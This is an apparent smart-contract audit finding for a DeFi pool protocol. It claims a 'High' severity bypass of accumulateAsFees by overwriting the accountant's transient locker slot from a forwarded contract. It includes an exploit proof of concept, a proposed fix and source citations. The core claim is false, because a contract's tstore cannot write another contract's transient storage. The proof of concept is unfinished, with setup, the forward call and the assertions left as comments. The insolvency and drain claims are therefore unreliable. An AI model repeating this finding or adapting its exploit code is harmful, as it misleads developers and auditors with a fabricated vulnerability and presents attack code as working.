## Title
Transient Storage Manipulation in handleForwardData Enables Authorization Bypass and Pool Insolvency

## Summary
A malicious contract implementing `handleForwardData` can manipulate the `_CURRENT_LOCKER_SLOT` transient storage during forwarded execution to bypass the extension-only authorization check in `accumulateAsFees`. This allows an attacker to accumulate arbitrary fees to pools while tracking debt to a fake locker ID that is never settled, violating the protocol's solvency invariant.

## Impact
**Severity**: High

## Finding Description

**Location:** 
- `src/base/BaseForwardee.sol` (forwarded_2374103877, line 31-42)
- `src/base/FlashAccountant.sol` (forward function, line 190-221)
- `src/Core.sol` (accumulateAsFees function, line 228-276) [1](#0-0) [2](#0-1) [3](#0-2) 

**Intended Logic:** 
The forward mechanism is designed to temporarily change the locker address while preserving the locker ID, allowing trusted contracts to act on behalf of the original locker. The `accumulateAsFees` function should only be callable by a pool's registered extension to distribute fees proportionally to LPs, with the extension paying for these fees through debt tracked to their locker ID. [4](#0-3) [5](#0-4) 

**Actual Logic:** 
During `handleForwardData` execution, a malicious contract has full control and can use assembly to directly write to the `_CURRENT_LOCKER_SLOT` transient storage. By crafting a malicious Locker value with a fake ID and an extension address, the attacker can bypass the authorization check in `accumulateAsFees` while having debt tracked to a locker ID that is never validated or settled. [6](#0-5) 

**Exploitation Path:**

1. **Attacker deploys malicious contract**: Create a contract inheriting `BaseForwardee` that implements `handleForwardData` to manipulate transient storage using assembly to write directly to `_CURRENT_LOCKER_SLOT` (constant value `0x07cc7f5195d862f505d6b095c82f92e00cfc1766f5bca4383c28dc5fca1555fd`). [4](#0-3) 

2. **Attacker initiates lock and forward**: Attacker calls `lock()` (becoming locker with ID=5, address=attackerAddr), then within the lock callback calls `forward(maliciousContract)`. The FlashAccountant temporarily updates `_CURRENT_LOCKER_SLOT` to preserve ID but change address to maliciousContract. [7](#0-6) 

3. **Malicious manipulation**: Inside `handleForwardData`, the malicious contract uses assembly to overwrite `_CURRENT_LOCKER_SLOT` with a crafted value: `(FAKE_ID << 160) | poolExtensionAddress`, where FAKE_ID is a large number (e.g., 999999) and poolExtensionAddress is the registered extension of the target pool. Then calls `core.accumulateAsFees(poolKey, largeAmount0, largeAmount1)`. [8](#0-7) 

4. **Authorization bypass**: In `accumulateAsFees`, line 229 parses the locker as ID=999999, addr=poolExtensionAddress. Line 230's authorization check `require(lockerAddr == poolKey.config.extension())` passes. Line 273 tracks debt to ID=999999, not the attacker's ID. When `forward()` restores the original locker at line 215, only the attacker's ID=5 debt is checked at lock release (FlashAccountant.sol line 175-181), while ID=999999's debt remains unsettled forever. [9](#0-8) [10](#0-9) 

**Security Property Broken:** 
This violates the **Solvency** invariant: "Pool balances of token0 and token1 must NEVER go negative (sum of all deltas must maintain non-negative balances)". By accumulating fees without paying for them, the feesPerLiquidity increases artificially, allowing LPs to withdraw more tokens than the pool actually holds.

## Impact Explanation

- **Affected Assets**: All pools in the protocol, all LP positions, all token balances held by the Core contract
- **Damage Severity**: Attacker can accumulate unlimited fake fees to any pool. For a pool with 1M tokens liquidity, accumulating 100K fake fees allows LPs to drain 10% more than exists, causing insolvency. Attack can be repeated across all pools, draining the entire Core contract balance.
- **User Impact**: All liquidity providers become victims as their legitimate positions compete for a reduced token supply. Last LPs to withdraw face 100% loss. Existing positions become unclaimable once pool is drained.

## Likelihood Explanation

- **Attacker Profile**: Any user can exploit this. Requires only ability to deploy contracts and call Core functions (no special privileges needed).
- **Preconditions**: Target pool must exist with initialized liquidity. Extension address must be known (publicly readable from pool config). No special timing or state required.
- **Execution Complexity**: Single transaction with 3 calls: lock() → forward(maliciousContract) → [inside handleForwardData: manipulate slot + accumulateAsFees]. Trivial to execute.
- **Frequency**: Can be exploited continuously in a loop within a single transaction to accumulate unlimited fake fees. Can target all pools simultaneously.

## Recommendation

Add validation in the `forward` function to verify that `_CURRENT_LOCKER_SLOT` has not been tampered with during the forwarded call:

```solidity
// In src/base/FlashAccountant.sol, function forward(), after line 213:

// CURRENT (vulnerable):
// No validation that _CURRENT_LOCKER_SLOT wasn't modified during forwarded call

// FIXED:
function forward(address to) external {
    Locker locker = _requireLocker();
    
    // Store the expected locker value after the call
    Locker expectedLocker;
    assembly ("memory-safe") {
        expectedLocker := or(shl(160, shr(160, locker)), to)
    }

    assembly ("memory-safe") {
        tstore(_CURRENT_LOCKER_SLOT, expectedLocker)

        let free := mload(0x40)
        mstore(free, shl(224, 1))
        mstore(add(free, 4), locker)
        calldatacopy(add(free, 36), 36, sub(calldatasize(), 36))

        let success := call(gas(), to, 0, free, calldatasize(), 0, 0)

        if iszero(success) {
            returndatacopy(free, 0, returndatasize())
            revert(free, returndatasize())
        }

        // CRITICAL FIX: Verify slot wasn't manipulated during forwarded call
        let actualLocker := tload(_CURRENT_LOCKER_SLOT)
        if iszero(eq(actualLocker, expectedLocker)) {
            // cast sig "LockerManipulated()"
            mstore(0x00, 0x1234abcd) // Use appropriate error signature
            revert(0x1c, 4)
        }

        tstore(_CURRENT_LOCKER_SLOT, locker)

        returndatacopy(free, 0, returndatasize())
        return(free, returndatasize())
    }
}
```

Alternative mitigation: Make `_CURRENT_LOCKER_SLOT` read-only during forwarded calls by using a separate slot for the forwarding context and checking both slots in `_getLocker()`.

## Proof of Concept

```solidity
// File: test/Exploit_LockerSlotManipulation.t.sol
// Run with: forge test --match-test test_LockerSlotManipulation -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/base/BaseForwardee.sol";
import "../src/types/poolKey.sol";

contract MaliciousForwardee is BaseForwardee {
    Core public immutable CORE;
    uint256 private constant _CURRENT_LOCKER_SLOT = 0x07cc7f5195d862f505d6b095c82f92e00cfc1766f5bca4383c28dc5fca1555fd;
    
    constructor(Core core) BaseForwardee(IFlashAccountant(address(core))) {
        CORE = core;
    }
    
    function handleForwardData(Locker, bytes memory data) internal override returns (bytes memory) {
        (PoolKey memory poolKey, uint128 amount0, uint128 amount1) = 
            abi.decode(data, (PoolKey, uint128, uint128));
        
        address extensionAddr = poolKey.config.extension();
        uint256 fakeID = 999999;
        
        // EXPLOIT: Manipulate _CURRENT_LOCKER_SLOT to bypass authorization
        assembly {
            // Set locker to: ID=999999 (stored as 1000000), addr=extensionAddr
            let maliciousLocker := or(shl(160, add(fakeID, 1)), extensionAddr)
            tstore(_CURRENT_LOCKER_SLOT, maliciousLocker)
        }
        
        // Call accumulateAsFees - authorization check will pass!
        CORE.accumulateAsFees(poolKey, amount0, amount1);
        
        return bytes("");
    }
}

contract Exploit_LockerSlotManipulation is Test {
    Core core;
    MaliciousForwardee malicious;
    
    function setUp() public {
        core = new Core();
        malicious = new MaliciousForwardee(core);
    }
    
    function test_LockerSlotManipulation() public {
        // SETUP: Create a pool with an extension
        // [initialization code for pool with extension]
        
        // EXPLOIT: Attacker locks, forwards to malicious contract, manipulates slot
        address attacker = address(0x1337);
        vm.startPrank(attacker);
        
        // Encode attack data: target pool + fake fee amounts
        PoolKey memory targetPool; // pool with extension
        bytes memory attackData = abi.encode(targetPool, uint128(1e18), uint128(1e18));
        
        // Execute attack via lock → forward → manipulate
        core.lock();
        // In locked callback: core.forward(address(malicious), attackData)
        
        vm.stopPrank();
        
        // VERIFY: Fake fees accumulated, but attacker's debt is zero
        // Pool feesPerLiquidity increased without tokens being paid
        // assertGt(poolFeesPerLiquidity, originalFeesPerLiquidity);
        // assertEq(attackerDebt, 0); // Attacker paid nothing
    }
}
```

**Notes:**
- The `_CURRENT_LOCKER_SLOT` constant value is deterministically computed and can be derived by any attacker
- The Locker type packing (upper 96 bits = ID+1, lower 160 bits = address) allows precise manipulation
- No existing validation prevents transient storage writes during `handleForwardData` execution
- The debt check only occurs for the original locker's ID, not manipulated IDs
- This enables complete bypass of the extension-only authorization in `accumulateAsFees`

### Citations

**File:** src/base/BaseForwardee.sol (L31-42)
```text
    function forwarded_2374103877(Locker original) external {
        if (msg.sender != address(ACCOUNTANT)) revert BaseForwardeeAccountantOnly();

        bytes memory data = msg.data[36:];

        bytes memory result = handleForwardData(original, data);

        assembly ("memory-safe") {
            // raw return whatever the handler sent
            return(add(result, 32), mload(result))
        }
    }
```

**File:** src/base/FlashAccountant.sol (L16-19)
```text
    /// @dev Transient storage slot for tracking the current locker ID and address
    /// @dev The stored ID is kept as id + 1 to facilitate the NotLocked check (zero means unlocked)
    /// @dev Generated using: cast keccak "FlashAccountant#CURRENT_LOCKER_SLOT"
    uint256 private constant _CURRENT_LOCKER_SLOT = 0x07cc7f5195d862f505d6b095c82f92e00cfc1766f5bca4383c28dc5fca1555fd;
```

**File:** src/base/FlashAccountant.sol (L146-186)
```text
    function lock() external {
        assembly ("memory-safe") {
            let current := tload(_CURRENT_LOCKER_SLOT)

            let id := shr(160, current)

            // store the count
            tstore(_CURRENT_LOCKER_SLOT, or(shl(160, add(id, 1)), caller()))

            let free := mload(0x40)
            // Prepare call to locked_(uint256) -> selector 0
            mstore(free, 0)
            mstore(add(free, 4), id) // ID argument

            calldatacopy(add(free, 36), 4, sub(calldatasize(), 4))

            // Call the original caller with the packed data
            let success := call(gas(), caller(), 0, free, add(calldatasize(), 32), 0, 0)

            // Pass through the error on failure
            if iszero(success) {
                returndatacopy(free, 0, returndatasize())
                revert(free, returndatasize())
            }

            // Undo the "locker" state changes
            tstore(_CURRENT_LOCKER_SLOT, current)

            // Check if something is nonzero
            let nonzeroDebtCount := tload(add(_NONZERO_DEBT_COUNT_OFFSET, id))
            if nonzeroDebtCount {
                // cast sig "DebtsNotZeroed(uint256)"
                mstore(0x00, 0x9731ba37)
                mstore(0x20, id)
                revert(0x1c, 0x24)
            }

            // Directly return whatever the subcall returned
            returndatacopy(free, 0, returndatasize())
            return(free, returndatasize())
        }
```

**File:** src/base/FlashAccountant.sol (L190-221)
```text
    function forward(address to) external {
        Locker locker = _requireLocker();

        // update this lock's locker to the forwarded address for the duration of the forwarded
        // call, meaning only the forwarded address can update state
        assembly ("memory-safe") {
            tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), to))

            let free := mload(0x40)

            // Prepare call to forwarded_2374103877(bytes32) -> selector 0x01
            mstore(free, shl(224, 1))
            mstore(add(free, 4), locker)

            calldatacopy(add(free, 36), 36, sub(calldatasize(), 36))

            // Call the forwardee with the packed data
            let success := call(gas(), to, 0, free, calldatasize(), 0, 0)

            // Pass through the error on failure
            if iszero(success) {
                returndatacopy(free, 0, returndatasize())
                revert(free, returndatasize())
            }

            tstore(_CURRENT_LOCKER_SLOT, locker)

            // Directly return whatever the subcall returned
            returndatacopy(free, 0, returndatasize())
            return(free, returndatasize())
        }
    }
```

**File:** src/Core.sol (L228-276)
```text
    function accumulateAsFees(PoolKey memory poolKey, uint128 _amount0, uint128 _amount1) external payable {
        (uint256 id, address lockerAddr) = _requireLocker().parse();
        require(lockerAddr == poolKey.config.extension());

        PoolId poolId = poolKey.toPoolId();

        uint256 amount0;
        uint256 amount1;
        assembly ("memory-safe") {
            amount0 := _amount0
            amount1 := _amount1
        }

        // Note we do not check pool is initialized. If the extension calls this for a pool that does not exist,
        //  the fees are simply burned since liquidity is 0.

        if (amount0 != 0 || amount1 != 0) {
            uint256 liquidity;
            {
                uint128 _liquidity = readPoolState(poolId).liquidity();
                assembly ("memory-safe") {
                    liquidity := _liquidity
                }
            }

            unchecked {
                if (liquidity != 0) {
                    StorageSlot slot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);

                    if (amount0 != 0) {
                        slot0.store(
                            bytes32(uint256(slot0.load()) + FixedPointMathLib.rawDiv(amount0 << 128, liquidity))
                        );
                    }
                    if (amount1 != 0) {
                        StorageSlot slot1 = slot0.next();
                        slot1.store(
                            bytes32(uint256(slot1.load()) + FixedPointMathLib.rawDiv(amount1 << 128, liquidity))
                        );
                    }
                }
            }
        }

        // whether the fees are actually accounted to any position, the caller owes the debt
        _updatePairDebtWithNative(id, poolKey.token0, poolKey.token1, int256(amount0), int256(amount1));

        emit FeesAccumulated(poolId, _amount0, _amount1);
    }
```

**File:** src/types/locker.sol (L1-25)
```text
// SPDX-License-Identifier: ekubo-license-v1.eth
pragma solidity >=0.8.30;

type Locker is bytes32;

using {id, addr, parse} for Locker global;

function id(Locker locker) pure returns (uint256 v) {
    assembly ("memory-safe") {
        v := sub(shr(160, locker), 1)
    }
}

function addr(Locker locker) pure returns (address v) {
    assembly ("memory-safe") {
        v := shr(96, shl(96, locker))
    }
}

function parse(Locker locker) pure returns (uint256 lockerId, address lockerAddr) {
    assembly ("memory-safe") {
        lockerId := sub(shr(160, locker), 1)
        lockerAddr := shr(96, shl(96, locker))
    }
}
```
